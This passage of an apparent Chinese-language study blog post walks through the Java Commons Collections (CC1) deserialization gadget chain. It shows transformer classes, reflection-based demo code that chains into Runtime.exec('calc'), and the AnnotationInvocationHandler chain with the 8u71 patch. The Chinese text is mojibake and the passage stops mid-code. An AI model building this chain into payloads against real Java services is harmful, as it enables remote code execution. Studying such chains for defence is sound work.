</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">methodName</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iParamTypes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iArgs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">input</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iParamTypes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iArgs</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}....</span><span class="w">
</span></span></span></code></pre></div><h3 id="constanttransformer">ConstantTransformer<a hidden class="anchor" aria-hidden="true" href="#constanttransformer">#</a></h3>
<p><strong><code>è¿”å›åˆå§‹åŒ–ä¼ å…¥çš„obj</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">ConstantTransformer</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iConstant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constantToReturn</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iConstant</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="chainedtransformer">ChainedTransformer<a hidden class="anchor" aria-hidden="true" href="#chainedtransformer">#</a></h3>
<p><code>åƒä¸€ä¸ªé“¾å­forè°ƒç”¨transformï¼Œä¸Šä¸€ä¸ªthis.iTransformers[i]è°ƒç”¨ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªobjectå‚æ•°</code></p>
<blockquote>
<p>è¿™é‡Œç€é‡çœ‹forçš„ä»£ç ï¼Œæ‰§è¡Œä¸€æ¬¡åobjectå€¼å°±è¢«è¦†ç›–äº†ï¼Œç„¶åå¦‚æœforæ²¡ç»“æŸè¿™é‡Œ++iï¼Œè¿™æ¬¡transformä¸­çš„objectå°±æ˜¯ä¸Šæ¬¡è¢«è¦†ç›–çš„objectå€¼ï¼ˆè¿™é‡Œèµ·åˆæ²¡çœ‹æ‡‚ï¼Œç¬¨è›‹ï¼‰,forèµ°å®Œæ‰ä¼šreturn</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="nf">ChainedTransformer</span><span class="p">(</span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">transformers</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTransformers</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">object</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¯¹è¿™å‡ ä¸ªæœ‰å¤§æ¦‚äº†è§£ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥å†™ä¸ªdemo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">keyTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p>ç›´æ¥è·å–Runtimeå¯¹è±¡ç„¶åè°ƒç”¨execæ–¹æ³•æ‰§è¡Œcalc</p>
</blockquote>
<h4 id="é—®é¢˜1-runtimeä¸èƒ½åºåˆ—åŒ–">é—®é¢˜1 Runtimeä¸èƒ½åºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜1-runtimeä¸èƒ½åºåˆ—åŒ–">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Exception in thread &#34;main&#34; java.io.NotSerializableException: java.lang.Runtime
</span></span></code></pre></div><p>Runtimeç±»æ˜¯æ²¡æœ‰ç»§æ‰¿Serializableçš„ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨<code>Runtime.getRuntime()</code>è‚¯å®šæ˜¯ä¸è¡Œçš„</p>
<p><strong>è§£å†³</strong>ï¼š</p>
<blockquote>
<p>å¯ä»¥ç”¨Runtime.class =&gt; å±äºjava.lang.Class =&gt; ç»§æ‰¿java.io.Serializable</p>
</blockquote>
<p>é‚£ä¹ˆå°±æ˜¯æ„é€ é—®é¢˜äº†ï¼Œä¸‹é¢æ˜¯demo2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="n">getRuntime</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">invoke</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h4 id="ç–‘é—®1-invokenull">ç–‘é—®1 invoke(null)<a hidden class="anchor" aria-hidden="true" href="#ç–‘é—®1-invokenull">#</a></h4>
<p>è¿™é‡Œä¸ºä»€ä¹ˆæ˜¯invoke(null),ä¸€èˆ¬ä¸éƒ½æ˜¯invoke(obj)ä¹ˆ</p>
<p><strong>è§£ç­”ï¼š</strong></p>
<p>ç»“è®ºï¼šå› ä¸º<code>getRuntime</code>æ˜¯é™æ€æ–¹æ³•</p>
<blockquote>
<p>åœ¨ Java ä¸­ï¼Œ**é™æ€æ–¹æ³•æ˜¯å±äºç±»æœ¬èº«è€Œä¸æ˜¯ç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰çš„æ–¹æ³•ã€‚**å¯ä»¥é€šè¿‡ç±»åç›´æ¥è°ƒç”¨é™æ€æ–¹æ³•ï¼Œè€Œæ— éœ€åˆ›å»ºç±»çš„å®ä¾‹ã€‚</p>
<p><code>Runtime.class.getMethod(&quot;getRuntime&quot;)</code>è·å–çš„æ˜¯<code>Runtime</code>ç±»çš„<code>getRuntime</code>æ–¹æ³•</p>
<p><code>getRuntime.invoke(null)</code>å®é™…ä¸Šå°±æ˜¯é€šè¿‡åå°„è°ƒç”¨é™æ€æ–¹æ³•<code>getRuntime</code>ï¼Œ<strong>ä¼ å…¥<code>null</code>è¡¨ç¤ºæ²¡æœ‰ç‰¹å®šçš„å¯¹è±¡å®ä¾‹å‚ä¸è°ƒç”¨ï¼Œ</strong></p>
<p><strong>å› ä¸ºè¯¥æ–¹æ³•æœ¬æ¥å°±ä¸éœ€è¦å¯¹è±¡å®ä¾‹æ¥è°ƒç”¨ã€‚</strong></p>
</blockquote>
<p>ä½†æ˜¯è¿™é‡Œä¸èƒ½ç›´æ¥è¿™æ ·ç”¨çœ‹åˆ°**<code>InvokerTransformer.transform</code>**ï¼Œè¿™é‡Œä¼ å…¥çš„<code>Runtime.class</code>ä¼šå˜æˆ<code>Class&lt;Class&lt;Runtime&gt;&gt;</code>ç›¸å½“äºClassç±»ä»–æ˜¯æ²¡æœ‰getRuntimeæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å¤Ÿç€å‡ºè¿™ä¸ªç»“æ„<code>Runtime.class.getMethod(&quot;getRuntime&quot;);</code>ä½†æ˜¯<code>getMethod</code>Classç±»æ˜¯æœ‰çš„æ‰€ä»¥æ„é€ è¿™ç§å½¢å¼<code>getMethod.invoke(Runtime.class, &quot;getRuntime&quot;,null);</code></p>
<p><img loading="lazy" src="../images/image-20241106152635204.png" alt="image-20241106152635204"  />
</p>
<p>demo3</p>
<p>å› ä¸ºæ¯è½®éƒ½è¦è¿›è¡Œä¸€æ¬¡<code>getClass()</code>æ‰€ä»¥ç»•äº†è¿™ä¹ˆå¤§ä¸ªåœˆå­</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//getMethod(String name, Class&lt;?&gt;... parameterTypes) ---- String.class, Class[].classæ˜¯ä¸ºäº†ä¸‹ä¸€æ¬¡getMethodè°ƒç”¨</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">getMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="p">)</span><span class="w"> </span><span class="n">getMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">myinvoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getRuntime</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Runtime</span><span class="w"> </span><span class="n">runtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Runtime</span><span class="p">)</span><span class="w"> </span><span class="n">myinvoke</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">getRuntime</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Method</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">runtime</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exec</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">runtime</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h3 id="ccåˆ©ç”¨demo">CCåˆ©ç”¨demo<a hidden class="anchor" aria-hidden="true" href="#ccåˆ©ç”¨demo">#</a></h3>
<p>æœ€ç»ˆåˆ©ç”¨demoï¼Œå¯¹äºCCæ¥è¯´èƒ½è°ƒç”¨åˆ°<strong>transform</strong>å°±èƒ½RCE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">   
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">keyTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w"> 
</span></span></span></code></pre></div><h1 id="commonscollections1"><strong>CommonsCollections1</strong><a hidden class="anchor" aria-hidden="true" href="#commonscollections1">#</a></h1>
<h3 id="transformedmapåˆ©ç”¨é“¾-8u71ä¹‹å‰"><strong>TransformedMapåˆ©ç”¨é“¾</strong> 8u71ä¹‹å‰<a hidden class="anchor" aria-hidden="true" href="#transformedmapåˆ©ç”¨é“¾-8u71ä¹‹å‰">#</a></h3>
<p><strong>åˆ©ç”¨é“¾</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sun.reflect.annotation.AnnotationInvocationHandler.readObject()
</span></span><span class="line"><span class="cl">	AbstractInputCheckedMapDecorator.setValue()
</span></span><span class="line"><span class="cl">    	TransformedMap.checkSetValue()
</span></span><span class="line"><span class="cl">			ChainedTransformer.transform()
</span></span><span class="line"><span class="cl">				è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„
</span></span></code></pre></div><blockquote>
<p>Java 8u71 ä»¥åç”±äº Java å®˜â½…ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°ï¼š</p>
<p>æ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿â½¤ååºåˆ—åŒ–å¾—åˆ°çš„ Map å¯¹è±¡ï¼Œâ½½æ˜¯æ–°å»ºäº†â¼€ä¸ª LinkedHashMap å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p>
<p>æ‰€ä»¥ï¼Œåç»­å¯¹ Map çš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„ LinkedHashMap å¯¹è±¡ï¼Œâ½½åŸæ¥æˆ‘ä»¬ç²¾â¼¼æ„é€ çš„ Map ä¸å†æ‰§â¾ set æˆ– put æ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘ RCE äº†ã€‚</p>
</blockquote>
<p>æ”¹åçš„<code>readObject</code>ï¼ˆè¿™é‡Œæ˜¯8u74ç‰ˆæœ¬ï¼‰,å¯ä»¥çœ‹åˆ°<code>setValue</code>æ–¹æ³•ä¹Ÿæ²¡æœ‰äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="p">.</span><span class="na">GetField</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">readFields</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;memberValues&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationType</span><span class="w"> </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AnnotationType</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="n">var3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IllegalArgumentException</span><span class="w"> </span><span class="n">var13</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidObjectException</span><span class="p">(</span><span class="s">&#34;Non-annotation type in annotation serial stream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var5</span><span class="p">.</span><span class="na">memberTypes</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashMap</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">var10</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">var11</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="n">Iterator</span><span class="w"> </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var4</span><span class="p">.</span><span class="na">entrySet</span><span class="p">().</span><span class="na">iterator</span><span class="p">();</span><span class="w"> </span><span class="n">var8</span><span class="p">.</span><span class="na">hasNext</span><span class="p">();</span><span class="w"> </span><span class="n">var7</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">var10</span><span class="p">,</span><span class="w"> </span><span class="n">var11</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="p">)</span><span class="n">var8</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
